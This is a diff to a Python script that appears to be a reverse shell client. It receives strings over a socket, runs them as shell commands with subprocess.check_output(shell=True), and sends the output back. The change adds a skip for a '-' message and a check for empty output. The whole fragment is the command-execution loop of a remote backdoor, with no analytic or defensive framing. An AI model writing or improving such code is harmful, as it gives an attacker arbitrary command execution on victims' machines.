@@ -11,9 +11,13 @@ while True:
     encoded_oser = oser.encode('utf-8')
     s.sendall(encoded_oser)
     data = (s.recv(1024)).decode('utf-8')
+
+    if data == '-':
+        continue
+    
     cmd = subprocess.check_output(data,shell=True)
 
-    if cmd == ''.encode('utf-8'):
+    if cmd == None or cmd == ''.encode('utf-8'):
         
         s.sendall("[-] DONE !".encode('utf-8'))
         continue
